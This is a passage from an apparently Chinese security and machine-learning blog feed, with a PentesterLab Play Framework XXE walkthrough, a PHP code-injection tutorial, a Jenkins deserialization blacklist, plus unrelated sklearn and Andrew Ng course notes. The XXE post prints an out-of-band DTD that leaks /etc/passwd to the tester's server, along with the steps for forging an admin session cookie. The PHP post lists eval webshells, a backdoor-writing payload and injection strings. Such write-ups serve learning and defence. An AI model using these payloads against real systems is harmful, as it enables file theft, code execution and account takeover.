"^org[.]apache[.]wicket[.].*", ".*org[.]apache[.]xalan.*", "^org[.]codehaus[.]groovy[.]runtime[.].*", "^org[.]hibernate[.].*", "^org[.]python[.].*", "^org[.]springframework[.](?!(\\p&#123;Alnum&#125;+[.])*\\p&#123;Alnum&#125;*Exception$).*", "^sun[.]rmi[.].*", "^javax[.]imageio[.].*", "^java[.]util[.]ServiceLoader$", "^java[.]net[.]URLClassLoader$" &#125;; 黑名单机制绕过可以通过分析补丁得到印证。 参考 http://www.securityfocus.com/bid/98056 https://blogs.securiteam.com/index.php/archives/3171 https://jenkins.io/security/advisory/2017-04-26/ https://github.com/jenkinsci/jenkins/commit/36b8285a41eb28333549e8d851f81fd80a184076 https://github.com/jenkinsci/jenkins/commit/f237601afd750a0eaaf961e8120b08de238f2c3f http://www.lilihongblog.com/Blog/jenkins+Slave+Receiving+Remote+Request]]></content>
      <categories>
        <category>Web安全</category>
      </categories>
      <tags>
        <tag>反序列化</tag>
        <tag>JAVA</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[play渗透框架XXE实体攻击]]></title>
    <url>%2F2017%2F04%2F21%2Fplay%E6%B8%97%E9%80%8F%E6%A1%86%E6%9E%B6XXE%E5%AE%9E%E4%BD%93%E6%94%BB%E5%87%BB%2F</url>
    <content type="text"><![CDATA[简要介绍本文记录的是利用play渗透框架学习XXE实体攻击的过程，实验环境来自于pentesterlab Play XML Entities, 下载页面的iso, 用虚拟机软件PD或vmvare安装即可。打开虚拟机，获取虚拟机ip地址，然后访问就可以实验了，并不需要开启服务等其他操作，非常简单易用。同时还配备了课程讲解https://pentesterlab.com/exercises/play_xxe/course. Play Framework是一个web的框架，在这个框架中，开发者可以快速的使用java或者scala编译开发web应用。这样可以有序管理代码，并且url可以像Ruby-on-Rails一样被映射。就像Ruby-on-Rails，当收到Http请求时，Play框架管理多种文本类型。 信息获取目标ip: 10.211.15.4, 访问如下: 练习的目标是: 读任意文件, 获取secret_url, login as admin。 实体攻击探测外部实体请求首先测试目标服务器是否解析XML内容，并请求外部实体。本地开启服务器，接收来自目标服务器的外部实体请求：python -m SimpleHTTPServer 8000, 然后burp发送如下请求 1234567891011121314POST /login HTTP/1.1Host: 10.211.55.14User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.12; rv:52.0) Gecko/20100101 Firefox/52.0Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3Referer: http://10.211.55.14/loginConnection: closeUpgrade-Insecure-Requests: 1Content-Type: text/xmlContent-Length: 96&lt;?xml version=&quot;1.0&quot;?&gt;&lt;!DOCTYPE foo SYSTEM &quot;http://10.211.55.2:8000/test.dtd&quot;&gt;&lt;foo&gt;&amp;e1;&lt;/foo&gt; 本地监听到如下内容，表明目标服务器解析XML内容，并发出了外部实体请求。 1210.211.55.14 - - [21/Apr/2017 11:29:17] code 404, message File not found10.211.55.14 - - [21/Apr/2017 11:29:17] &quot;GET /test.dtd HTTP/1.1&quot; 404 - 注意: burp发出的请求的Content-Type必须为: text/xml, 而不能是application/xml, 猜测是目标服务器限制了解析的xml mime类型。 任意文件读取目标服务器会请求外部实体，那么可以本地写test.dtd, 返回给目标服务器，test.dtd内容如下。 123&lt;!ENTITY % p1 SYSTEM &quot;file:///etc/passwd&quot;&gt;&lt;!ENTITY % p2 &quot;&lt;!ENTITY e1 SYSTEM &apos;http://10.211.55.2:8000/BLAH?%p1;&apos;&gt;&quot;&gt;%p2; burp再次发生之前的请求，本地服务器能监听到: 12310.211.55.14 - - [21/Apr/2017 11:54:10] &quot;GET /test.dtd HTTP/1.1&quot; 200 -10.211.55.14 - - [21/Apr/2017 11:54:10] code 404, message File not found10.211.55.14 - - [21/Apr/2017 11:54:10] &quot;GET /BLAH?root:x:0:0:root:/root:/bin/sh%0Alp:x:7:7:lp:/var/spool/lpd:/bin/sh%0Anobody:x:65534:65534:nobody:/nonexistent:/bin/false%0Atc:x:1001:50:Linux%20User,,,:/home/tc:/bin/sh%0Apentesterlab:x:1000:50:Linux%20User,,,:/home/pentesterlab:/bin/sh%0Aplay:x:100:65534:Linux%20User,,,:/opt/play-2.1.3/xxe/:/bin/false%0Amysql:x:101:65534:Linux%20User,,,:/home/mysql:/bin/false%0A HTTP/1.1&quot; 404 - 显然，成功读取目标服务器/etc/passwd文件内容，接着应该去获取secret_url, 那么需要知道目标服务器源码文件的内容，从获取的/etc/passwd文件内容可以发现用户play的路径为/opt/play-2.1.3/xxe/, 那么改变test.dtd，读/opt/play-2.1.3/xxe/目录: 123&lt;!ENTITY % p1 SYSTEM &quot;file:///opt/play-2.1.3/xxe/&quot;&gt;&lt;!ENTITY % p2 &quot;&lt;!ENTITY e1 SYSTEM &apos;http://10.211.55.2:8000/BLAH?%p1;&apos;&gt;&quot;&gt;%p2; 得到如下内容: 123456789101112131410.211.55.14 - - [21/Apr/2017 15:21:24] &quot;GET /BLAH?.gitignore%0A.settings%0Aapp%0Aconf%0Alogs%0Aproject%0Apublic%0AREADME%0ARUNNING_PID%0Atarget%0Atest%0A HTTP/1.1&quot; 404 -# url decode.gitignore.settingsappconflogsprojectpublicREADMERUNNING_PIDtargettest 通常，java框架会有路由配置url映射，那么可以访问/opt/play-2.1.3/xxe/conf/目录(采用和上面相同的方式)，得到如下内容: 12345610.211.55.14 - - [21/Apr/2017 12:56:38] &quot;GET /BLAH?application.conf%0Aevolutions%0Aroutes%0A HTTP/1.1&quot; 404 -# url decodeapplication.confevolutionsroutes 在访问routes,有如下内容 1234567GET / controllers.Application.index()GET /0ecf87346b9c0b370f8d63e6e7fed4f0 controllers.Application.secret_url()GET /login controllers.Application.loginPOST /login controllers.Application.loginGET /logout controllers.Application.logoutGET /assets/*file controllers.Assets.at(path=&quot;/public&quot;, file) 得到secret_url为:0ecf87346b9c0b370f8d63e6e7fed4f0, 访问。 伪造cookie要实现admin用户登录，要么获取密码或登录绕过，要么利用cookie伪造登录，这里仅探讨伪造cookie登录。要实现cookie的伪造，那么需要知道目标服务器设置session的加密方式，访问/opt/play-2.1.3/xxe/conf/application.conf文件，得到application.secret=&quot;X7G@Abg53=2p=][5F;uMNDm/QrDtVG0^iYHC3]Ov0t0E6b_amL16UynUbqS_?_eG&quot;. 12345678application.secret=&quot;X7G@Abg53=2p=][5F;uMNDm/QrDtVG0^iYHC3]Ov0t0E6b_amL16UynUbqS_?_eG&quot;application.langs=&quot;en&quot;db.default.driver=com.mysql.jdbc.Driverdb.default.url=&quot;mysql://pentesterlab:pentesterlab@localhost/xxe&quot;ebean.default=&quot;models.*&quot;logger.root=ERRORlogger.play=INFOlogger.application=DEBUG session的管理在app/controllers/Application.java中（或者.scala）, 核心代码如下: 12345User user = User.findByUsername(username);if (user!=null) &#123; if (user.password.equals(md5(username+&quot;:&quot;+password) )) &#123; session(&quot;user&quot;,username); return redirect(&quot;/&quot;); 显然，我们要利用user=admin来伪造session. framework/src/play/src/main/scala/play/api/mvc/Http.scala中： 123456789def encode(data: Map[String, String]): String = &#123; val encoded = data.map &#123; case (k, v) =&gt; URLEncoder.encode(k, &quot;UTF-8&quot;) + &quot;=&quot; + URLEncoder.encode(v, &quot;UTF-8&quot;) &#125;.mkString(&quot;&amp;&quot;) if (isSigned) Crypto.sign(encoded) + &quot;-&quot; + encoded else encoded&#125; 可知，session内容的格式为: signature-name1=value1&amp;name2=value2, 其实name1,value1等都经过url编码处理, 其中encoded=name1=value1&amp;name2=value2, signature=Crypto.sign(encoded)。 加密函数如下： 12345def sign(message: String, key: Array[Byte]): String = &#123; val mac = Mac.getInstance(&quot;HmacSHA1&quot;) mac.init(new SecretKeySpec(key, &quot;HmacSHA1&quot;)) Codecs.toHexString(mac.doFinal(message.getBytes(&quot;utf-8&quot;))) &#125; 其中key= &quot;[KEY FOUND IN conf/application.conf]&quot;, 那么利用python伪造session内容，过程如下: 12345678In [1]: import hashlibIn [6]: import hmacIn [9]: key = "X7G@Abg53=2p=][5F;uMNDm/QrDtVG0^iYHC3]Ov0t0E6b_amL16UynUbqS_?_eG"In [10]: data = "user=admin"In [11]: h = hmac.new(key, data, hashlib.sha1)In [12]: h.hexdigest()Out[12]: 'a5b8363ce748cfbb5d654edc3676d440173b33de' 这里必须使用hmac库，而不能仅仅使用hashlib库来计算sha1, 因为hmac库使用key来生成salt, 然后用hashlib.sha1来计算hash值，而不是直接对key+data生成hash值。 然后进行cookie伪造，cookie名字就是PLAY_SESSION, burp请求如下: 123456789GET / HTTP/1.1Host: 10.211.55.14User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.12; rv:52.0) Gecko/20100101 Firefox/52.0 FirePHP/0.7.4Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3x-insight: activateCookie: PLAY_SESSION=&quot;a5b8363ce748cfbb5d654edc3676d440173b33de-user=admin&quot;Connection: closeUpgrade-Insecure-Requests: 1 后记XXE注入的本质是网站允许提交xml内容，而后台处理xml时不规范导致存在解析了xml内容中的外部实体。因此，如果网站允许提交xml内容，则可能存在XXE注入漏洞。 参考 https://pentesterlab.com/exercises/play_xxe/course freebuf Play框架的XML Entity Exploit XML实体攻击回顾]]></content>
      <categories>
        <category>Web安全</category>
      </categories>
      <tags>
        <tag>XXE</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[PHP代码注入和命令注入]]></title>
    <url>%2F2017%2F04%2F18%2FPHP%E4%BB%A3%E7%A0%81%E6%B3%A8%E5%85%A5%E5%92%8C%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5%2F</url>
    <content type="text"><![CDATA[代码注入和命令注入代码注入攻击通常是指：用户输入未作严格过滤，导致提交的内容传入某些函数会被当做PHP代码执行,而命令注入攻击通常是指：用户输入未作严格过滤，导致提交的内容传入某些函数会被当做系统命令执行。可以看出代码注入攻击和命令注入攻击是类似的，不同点在于，代码注入攻击要实现的功能限制在注入的语言本身，而命令注入是利用已有的系统命令，通常受shell限制。 代码注入攻击代码注入攻击一般出现在不安全的使用某些函数，文件包含导致代码注入攻击，反序列化导致的代码注入攻击。 常见的相关函数代码执行函数有: eval, assert, 正则匹配函数:preg_replace, 动态代码执行函数: create_function, call_user_func, call_user_func_array。 eval 123456789101112131415161718192021222324# 1. 没有任何过滤&lt;?php@eval($_GET["cmd"]);?&gt;?cmd=phpinfo();?cmd=fputs(fopen('test.php','w'),'&lt;?php @eval($_POST[test])?&gt;')# 2. addslashes 过滤&lt;?php$cmd = @(string)$_GET["cmd"];eval('$cmd="' . addslashes($cmd) . '";');?&gt;# $&#123;$&#123;&#125;&#125; 绕过cmd=$&#123;$&#123;phpinfo()&#125;&#125;# 3 双引号包含过滤&lt;?php$cmd = "echo \"hello " . $_GET['cmd'] . "\";";eval($cmd);# $&#123;$&#123;&#125;&#125; 绕过cmd=$&#123;$&#123;phpinfo()&#125;&#125; ${${}} 绕过是利用可变变量的二次嵌套，执行里面花括号内的代码，如: echo &quot;${${phpinfo()}}&quot;;, 会执行phpinfo(), 这里必须是双引号包含，双引号包含时会解析包含的字符串中的变量。 PHP可变变量可以无需二次嵌套，一次也可以执行，echo &quot;${phpinfo()}&quot;;这种情况是不能执行的，而echo &quot;${/**/phpinfo()}&quot;;是能执行phpinfo()的, 这是因为花括号解析语法的关键条件是花括号内的第一个字符，空格，tab，注释，回车是各种语法分析引擎中常见的分割字符，@是PHP语法的一个特殊的容错符号，所以可变变量内的花括号有这么一个规则，需要判断花括号内的内容是否为真正的代码，条件即是文本的第一个字符串是否为PHP语法解析引擎的分割字符和特殊的语法符号, 因此下面代码都能执行。 12 php &gt;= 4.3 12345678910111213"$&#123; phpinfo()&#125;";"$&#123; phpinfo()&#125;";"$&#123;/**/phpinfo()&#125;";"$&#123;phpinfo()&#125;";"$&#123;@phpinfo()&#125;";"$&#123;( string )phpinfo()&#125;";"$&#123;phpinfo[phpinfo()]&#125;";"&#123;$phpinfo[phpinfo()]&#125;";"&#123;$&#123;phpinfo()&#125;&#125;";"$&#123;$&#123;phpinfo()&#125;&#125;"; 更新：php&gt;=5.5 1"$&#123;phpinfo()&#125;"; 执行phpinfo(). assert 1234&lt;?php@assert($_GET["cmd"]);?&gt;cmd=phpinfo(); preg_replacepreg_replace()函数可以引发代码执行，源于PCRE (Perl Compatible Regular Expressions) 中的e(PREG_REPLACE_EVAL)选项，这个选项会把replacement中的内容当做PHP代码执行，并取返回结果的值，其中后项引用可以是$1，也可以是\\1。当replacement 参数构成一个合理的php 代码字符串的时候，/e 修正符使preg_replace()，将replacement 参数当做php 代码执行。 第一个参数 pattern的代码注入 123456# magic_quotes_gpc=Off时，导致代码执行。&lt;?php$regexp = $_GET['reg'];$var = '&lt;php&gt;phpinfo()&lt;/php&gt;';preg_replace("/&lt;php&gt;(.*?)$regexp", '\\1', $var);?&gt; 提交：reg=%3C\/php%3E/e, 执行 phpinfo(), 即pattern参数注入/e修正符。 一般情况是不会有e选项的，我们可以通过%00截断等方式来添加 12345&lt;?php $regexp = $_GET['re']; $var = '&lt;tag&gt;phpinfo()&lt;/tag&gt;'; preg_replace("/&lt;tag&gt;(.*?)$regexp&lt;\/tag&gt;/", '\\1', $var); ?&gt; 提交：reg=%3C\/php%3E/e%00. 第二个参数replacement 1234# /e 修正符使preg_replace()，将replacement 参数当做php 代码执行&lt;?phppreg_replace(&quot;//e&quot;, $_GET[&apos;cmd&apos;], &quot;cmd test&quot;);?&gt; 提交:cmd=phpinfo() 第三个参数 123&lt;?preg_replace("/\s*\[php\](.+?)\[\/php\]\s*/ies", "\\1", $_GET['h']);?&gt; 提交：h=[php]phpinfo()[/php]。 其他函数 array_map 12345&lt;?php$evil_callback = $_GET['callback'];$some_array = array(0, 1, 2, 3);$new_array = array_map($evil_callback, $some_array);?&gt; 提交 http://127.0.0.1/array_map.php?callback=phpinfo, 即执行phpinfo() 12345678910111213141516171819202122array_map()usort(), uasort(), uksort()array_filter()array_reduce()array_diff_uassoc(), array_diff_ukey()array_udiff(), array_udiff_assoc(), array_udiff_uassoc()array_intersect_assoc(), array_intersect_uassoc()array_uintersect(), array_uintersect_assoc(), array_uintersect_uassoc()array_walk(), array_walk_recursive()xml_set_character_data_handler()xml_set_default_handler()xml_set_element_handler()xml_set_end_namespace_decl_handler()xml_set_external_entity_ref_handler()xml_set_notation_decl_handler()xml_set_processing_instruction_handler()xml_set_start_namespace_decl_handler()xml_set_unparsed_entity_decl_handler()stream_filter_register()set_error_handler()register_shutdown_function()register_tick_function() 文件包含导致代码注入攻击PHP文件包含会执行包含文件的代码，当开启了远程文件包含，则非常容易引起代码注入攻击。远程文件包含条件: allow_url_fopen=On, allow_url_include=On, 文件包含相关函数有: include, include_once, require, require_once。 123&lt;?phpinclude($_GET['cmd']);?&gt; 提交：cmd=data:text/plain,%3C?php%20phpinfo%28%29;?%3E, 即执行phpinfo()。 反序列化导致的代码注入攻击12345678910&lt;?phpclass Example &#123; var $var = ''; function __destruct() &#123; eval($this-&gt;var); &#125;&#125;unserialize($_GET['saved_code']);?&gt; 提交: unserialize.php?saved_code=O:7:%22Example%22:1:{s:3:%22var%22;s:10:%22phpinfo%28%29;%22;},即执行phpinfo() 绕过方法有一些程序中会判断用户输入是不是一个序列化的数据，常见的代码如下123456789101112$token = $data[0]; switch ( $token ) &#123; case 's' : if ( '"' !== $data[$length-2] ) return false; case 'a' : case 'O' : return (bool) preg_match( "/^&#123;$token&#125;:[0-9]+:/s", $data ); case 'b' : case 'i' : case 'd' : return (bool) preg_match( "/^&#123;$token&#125;:[0-9.E-]+;\$/", $data ); 这个可以用+来绕过，这也属于PHP的一种特性: O:+4:&quot;test&quot;:1:{s:1:&quot;a&quot;;s:3:&quot;aaa&quot;;}]]></content>
      <categories>
        <category>Web安全</category>
      </categories>
      <tags>
        <tag>PHP</tag>
        <tag>代码注入</tag>
        <tag>命令注入</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[sklearn训练逻辑回归和感知机模型]]></title>
    <url>%2F2017%2F04%2F12%2Fsklearn%E8%AE%AD%E7%BB%83%E9%80%BB%E8%BE%91%E5%9B%9E%E5%BD%92%E5%92%8C%E6%84%9F%E7%9F%A5%E6%9C%BA%E6%A8%A1%E5%9E%8B%2F</url>
    <content type="text"><![CDATA[调用sklearn内置的逻辑回归和感知机训练鸢尾花（Iris）数据集。 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117# -*- coding: utf-8 -*-# author: janes# date: 2017年4月11日 18:30from sklearn import datasetsfrom sklearn.model_selection import train_test_splitfrom sklearn.preprocessing import StandardScalerfrom sklearn.linear_model import Perceptronfrom sklearn.linear_model import LogisticRegressionfrom sklearn.metrics import accuracy_scoreimport matplotlib.pyplot as pltfrom matplotlib.colors import ListedColormapimport numpy as npdef plot_decision_regions(X, y, classifier, test_idx=None, resolution=0.02): # setup marker generator and color map markers = ('s', 'x', 'o', '^', 'v') colors = ('red', 'blue', 'lightgreen', 'gray', 'cyan') cmap = ListedColormap(colors[:len(np.unique(y))]) # plot the decision surface x1_min, x1_max = X[:, 0].min() - 1, X[:, 0].max() + 1 x2_min, x2_max = X[:, 1].min() - 1, X[:, 1].max() + 1 xx1, xx2 = np.meshgrid(np.arange(x1_min, x1_max, resolution), np.arange(x2_min, x2_max, resolution)) Z = classifier.predict(np.array([xx1.ravel(), xx2.ravel()]).T) Z = Z.reshape(xx1.shape) plt.contourf(xx1, xx2, Z, alpha=0.4, cmap=cmap) plt.xlim(xx1.min(), xx1.max()) plt.ylim(xx2.min(), xx2.max()) # plot class samples for idx, cl in enumerate(np.unique(y)): plt.scatter(x=X[y == cl, 0], y=X[y == cl, 1], alpha=0.8, c=cmap(idx), marker=markers[idx], label=cl) # highlight test samples if test_idx: X_test, y_test = X[test_idx, :], y[test_idx] plt.scatter(X_test[:, 0], X_test[:, 1], c='', alpha=1.0, linewidth=1, marker='o', s=55, label='test set')def test_perceptron(): iris = datasets.load_iris() # choose petal length and petal width as feature X = iris.data[:, [2, 3]] y = iris.target # 随机拿出数据集中30%的部分做测试, # 设置random_state(not None), 相当于设置随机数种子，每次运行随机抽样的结果相同 X_train, X_test, y_train, y_test = train_test_split(X, y, test_size=0.3, random_state=None) # 为了追求机器学习和最优化算法的最佳性能，进行特征缩放 sc = StandardScaler() sc.fit(X_train) X_train_std = sc.transform(X_train) # 用"同样的参数"来标准化测试集，使得测试集和训练集之间有可比性 X_test_std = sc.transform(X_test) # n_iter：可以理解成梯度下降中迭代的次数 # eta0：可以理解成梯度下降中的学习率 # random_state：设置随机种子(not None)，为了每次迭代都有相同的训练集顺序 ppn = Perceptron(n_iter=100, eta0=0.05, random_state=None) ppn.fit(X_train_std, y_train) # 分类测试集，将返回一个测试结果的数组 y_pred = ppn.predict(X_test_std) # plt.scatter(np.arange(0, len(y_pred)), y_pred, c='b', marker='|',) # plt.scatter(np.arange(0, len(y_test)), y_test, c='r', marker='_',) # plt.show() # 计算模型在测试集上的准确性 score = accuracy_score(y_test, y_pred) return scoredef test_logistic(): iris = datasets.load_iris() # choose petal length and petal width as feature X = iris.data[:, [2, 3]] y = iris.target # 随机拿出数据集中30%的部分做测试, # 设置random_state(not None), 相当于设置随机数种子，每次运行随机抽样的结果相同 X_train, X_test, y_train, y_test = train_test_split(X, y, test_size=0.3, random_state=None) # 为了追求机器学习和最优化算法的最佳性能，进行特征缩放 sc = StandardScaler() sc.fit(X_train) X_train_std = sc.transform(X_train) # 用"同样的参数"来标准化测试集，使得测试集和训练集之间有可比性 X_test_std = sc.transform(X_test) lr = LogisticRegression(C=1000.0, random_state=0) lr.fit(X_train_std, y_train) # 查看第一个测试样本属于各个类别的概率 # predict_proba返回的是一个两列的矩阵，矩阵的每一行代表的是对一个事件的预测结果， # 第一列代表该事件不会发生的概率，第二列代表的是该事件会发生的概率 lr.predict_proba(X_test_std[0, :].reshape(1, -1)) # vstack(): Stack arrays in sequence vertically(row wise). X_combined_std = np.vstack((X_train_std, X_test_std)) y_combined = np.hstack((y_train, y_test)) plot_decision_regions(X_combined_std, y_combined, classifier=lr, test_idx=range(105, 150)) plt.xlabel('petal length [standardized]') plt.ylabel('petal width [standardized]') plt.legend(loc='upper left') plt.show()if __name__ == '__main__': # for _ in range(30): # print(test_perceptron()) test_logistic()]]></content>
      <categories>
        <category>机器学习</category>
      </categories>
      <tags>
        <tag>感知机</tag>
        <tag>逻辑回归</tag>
        <tag>sklearn</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[吴恩达机器学习笔记(二)]]></title>
    <url>%2F2017%2F04%2F11%2F%E5%90%B4%E6%81%A9%E8%BE%BE%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-%E4%BA%8C%2F</url>
    <content type="text"><![CDATA[第三周逻辑回归模型关于分类问题，首先讨论二分类问题，即输出值$y$只有两种值0和1，$y=1$表示正分类，$y=0$表示负分类。预测函数h_\theta(x)表示如下: h_\theta(x) = g(\theta^T x)z = \theta^T xg(z) = \dfrac{1}{1 + e^{-z}}$g(z)$为”Sigmoid”函数，也称为逻辑函数。 $h_{\theta}(x)$表示的是输出为1的概率。 h_\theta(x) = P(y=1 | x ; \theta) = 1 - P(y=0 | x ; \theta)P(y = 0 | x;\theta) + P(y = 1 | x ; \theta) = 1 判定边界h_\theta(x) \geq 0.5 \Rightarrow y = 1h_\theta(x) < 0.5 \Rightarrow y = 0\theta^T x \geq 0 \Rightarrow y = 1\theta^T x < 0 \Rightarrow y = 0代价函数逻辑回归代价函数定义如下: J(\theta) = \dfrac{1}{m} \sum_{i=1}^m \mathrm{Cost}(h_\theta(x^{(i)}),y^{(i)})\mathrm{Cost}(h_\theta(x),y) = -\log(h_\theta(x)) \text{if y = 1}\mathrm{Cost}(h_\theta(x),y) = -\log(1-h_\theta(x)) \text{if y = 0}简化代价函数: \mathrm{Cost}(h_\theta(x),y) = - y \; \log(h_\theta(x)) - (1 - y) \log(1 - h_\theta(x))J(\theta) = - \frac{1}{m} \displaystyle \sum_{i=1}^m [y^{(i)}\log (h_\theta (x^{(i)})) + (1 - y^{(i)})\log (1 - h_\theta(x^{(i)}))]根据代价函数，可以得到如下结果: \mathrm{Cost}(h_\theta(x),y) = 0 \text{ if } h_\theta(x) = y\mathrm{Cost}(h_\theta(x),y) \rightarrow \infty \text{ if } y = 0 \mathrm{and} h_\theta(x) \rightarrow 1\mathrm{Cost}(h_\theta(x),y) \rightarrow \infty \text{ if } y = 1 \mathrm{and} h_\theta(x) \rightarrow 0矩阵表达式如下($X$为设计矩阵[mx(n+1)]): h = g(X\theta)J(\theta) = \frac{1}{m} \cdot \left(-y^{T}\log(h)-(1-y)^{T}\log(1-h)\right)梯度下降J(\theta) = \frac{1}{m} \cdot \left(-y^{T}\log(h)-(1-y)^{T}\log(1-h)\right)要使代价函数J(\theta)最小，依旧采用求偏导的方式，同时更新下面表达式: \theta_j := \theta_j - \alpha \dfrac{\partial}{\partial \theta_j}J(\theta)矩阵表达式如下: \theta := \theta - \frac{\alpha}{m} X^{T} (g(X \theta ) - \vec{y})优化$\theta$,除了梯度下降算法，还有”Conjugate gradient”, “BFGS”, 和”L-BFGS”等其他优化算法，能更快更精确的优化$\theta$参数,但是算法也更复杂。 多分类: One-vs-ally \in \lbrace0, 1 ... n\rbraceh_\theta^{(0)}(x) = P(y = 0 | x ; \theta)h_\theta^{(1)}(x) = P(y = 1 | x ; \theta)\cdotsh_\theta^{(n)}(x) = P(y = n | x ; \theta)\mathrm{prediction} = \max_i( h_\theta ^{(i)}(x) )过拟合通常有两种方式处理过拟合问题 减少样本特征数量 手动选择所需的特征 使用模型选择算法 正则化 保留所有的特征，但是减小参数$\theta_j$的大小 当拥有大量有用的特征时，正则化是有效的 正则化线性回归引入正则化参数$\lambda$，$\lambda$过大可能造成欠拟合 min_\theta\ \dfrac{1}{2m}\ \sum_{i=1}^m (h_\theta(x^{(i)}) - y^{(i)})^2 + \lambda\ \sum_{j=1}^n \theta_j^2应用梯度下降算法 \theta_0 := \theta_0 - \alpha\ \frac{1}{m}\ \sum_{i=1}^m (h_\theta(x^{(i)}) - y^{(i)})x_0^{(i)}\theta_j := \theta_j - \alpha\ \left[ \left( \frac{1}{m}\ \sum_{i=1}^m (h_\theta(x^{(i)}) - y^{(i)})x_j^{(i)} \right) + \frac{\lambda}{m}\theta_j \right] \ \ \ \ \ \ \ \ \ \ j \in \lbrace 1,2...n\theta_j := \theta_j(1 - \alpha\frac{\lambda}{m}) - \alpha\frac{1}{m}\sum_{i=1}^m(h_\theta(x^{(i)}) - y^{(i)})x_j^{(i)}式子中\frac{\lambda}{m}\theta_j完成正则化。 标准方程表示\theta = \left( X^TX + \lambda \cdot L \right)^{-1} X^Ty\text{where}\ \ L = \begin{bmatrix} 0 & & & & \newline & 1 & & & \newline & & 1 & & \newline & & & \ddots & \newline & & & & 1 \newline\end{bmatrix}]]></content>
      <categories>
        <category>机器学习</category>
      </categories>
      <tags>
        <tag>逻辑回归</tag>
        <tag>分类</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[以数据为中心的网络安全]]></title>
    <url>%2F2017%2F04%2F11%2F%E4%BB%A5%E6%95%B0%E6%8D%AE%E4%B8%BA%E4%B8%AD%E5%BF%83%E7%9A%84%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%2F</url>
    <content type="text"><![CDATA[数据为中心的网络安全随着联网设备的多样化以及移动办公的兴起，传统网络安全边界在逐渐消失，当几乎不存在网络边界的时候，怎么保证网络安全？当越来越多的用户可随时通过各种方法接入公司网络的时候，怎么跟踪授权和非授权用户。于是，当今企业安全面对的主要问题，就是：网络安全工具、服务和解决方案的重心一直都在该网络安全“堡垒”概念上，而这又转换成对保护网络(及硬件)中所有组件的安全产品的重视，以及对业务(及软件)执行相关应用和程序的相对放松。面对现代错综复杂的网络接入方式，可以采用以数据为中心的网络环境安全方法，重点应首先放在明确有哪些有价值数据和信息，及其对公司的价值，而其他强调技术的策略应围绕保护该有价值数据来发展。首先需要对数据进行分类(数据分类)，知道哪些数据对企业运营的有巨大的价值；然后进行数据流或业务流分析，一旦数据被识别并分类，就必须评估数据在网络中的发现点，都有谁访问或“消费”这些数据、分别是出于何种目的，数据从产生到消亡过程中在网络里巡游的全部踪迹，以及数据到达生命周期末尾时是怎么处理的；最后再应用风险管理模型，在理解了保护的数据对象是什么的基础上，进行数据流分析，发现数据存储或处理的位置，以及谁能或谁应该访问这些数据。然应用正确的安全控制措施。以上公式的元素有: 风险：比如数据遗失或被盗，数据篡改； 漏洞：薄弱环节，往往是编程缺陷、编码错误、不当配置等； 威胁：基本上就是攻击者做事的方法——远程侵入、物理破坏、网络钓鱼、病毒，或者恶意软件； 对策：以安全之名所做的所有事。包括VPN或防火墙之类访问控制措施的部署、入侵检测系统、警报和监视解决方案、文件完整性监测、白名单解决方案，以及终端防护； 估值：想保护的东西的价值，还有安全工作的成本 风险管理模型的目标是要减小风险,减小风险的方法，就是减少环境中漏洞，识别并封锁或威慑威胁，以及实现安全对策以降低漏洞或威胁所留影响的组合。这是一个持续的过程，必须不断考虑技术、人员、公司使命和威胁态势的改变。持续运作的过程，需要被写下来，被遵循，并定期修订以反映运营的最新变化。这种安全方法可被称为安全生命周期，拥有以下特性： 从知道要保护什么东西开始 安全需要系统性方法（评估当前位置、记录想去往何方、实现安全架构） 策略即战略 架构就是策略得以实施的连贯集成战术集 没有策略的安全只不过是技术]]></content>
      <categories>
        <category>信息安全</category>
      </categories>
      <tags>
        <tag>网络安全</tag>
        <tag>数据</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[吴恩达机器学习笔记(一)]]></title>
    <url>%2F2017%2F04%2F08%2F%E5%90%B4%E6%81%A9%E8%BE%BE%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-%E4%B8%80%2F</url>
    <content type="text"><![CDATA[第一周机器学习的定义Tom Mitchell (1998) Well-posed Learning Problem: “A computer program is said to learn from experience E with respect to some task T and some performance measure P, if its performance on T, as measured by P, improves with experience E”. 对于某类任务T和性能度量P，如果一个计算机程序在T上以P衡量的性能随着经验E而自我完善，那么我们称这个计算机程序在从经验E学习 机器学习分类: 监督学习(Supervised learning)和无监督学习(Unsupervised learning) 监督学习监督学习从给定的训练数据集中学习出一个函数，当新的数据到来时，可以根据这个函数预测结果。监督学习的训练集要求是包括输入和输出，也可以说是特征和目标。训练集中的目标是由人标注的。常见的监督学习算法包括回归分析和统计分类。 回归问题，是在一个连续的输出上预测结果，即将输入映射到连续的输出函数，而分类问题，是在离散的输出上预测结果，即将输入映射到离散的类别。 无监督学习与监督学习相比，训练集没有人为标注的结果。常见的无监督学习算法有聚类 无监督学习允许我们在不知道或很少知道正确输出结果样式的情况下，从数据中获取结构，而且不需要了解各种变量对输出结果的影响。通过数据集群中数据变量间的关系，可以推导出结构。并且无监督学习不需要基于预测结果的反馈。 单变量线性回归模型符号表示: 1.x^{(i)} 表示输入变量，也叫作输入特征，上标i仅仅表示训练集中的第i个样本;2.y^{(i)} 表示输出变量，也叫作目标变量;3.(x^{(i)}, y^{(i)}) 表示一个训练样本;4.m表示训练样本的个数, i=1,…,m。 代价函数函数h称作假设函数(hypothesis), 定义为: h_{\theta}(x) = \theta_0 + \theta_1x, 简写为: $h(x) = \theta_0 + \theta_1x$。这里使用线性函数，而没有使用非线性函数，因为线性函数最简单，因此先从线性函数入手, 之后再讨论更复杂的模型。这个线性模型被称为线性回归(linear regression)模型, 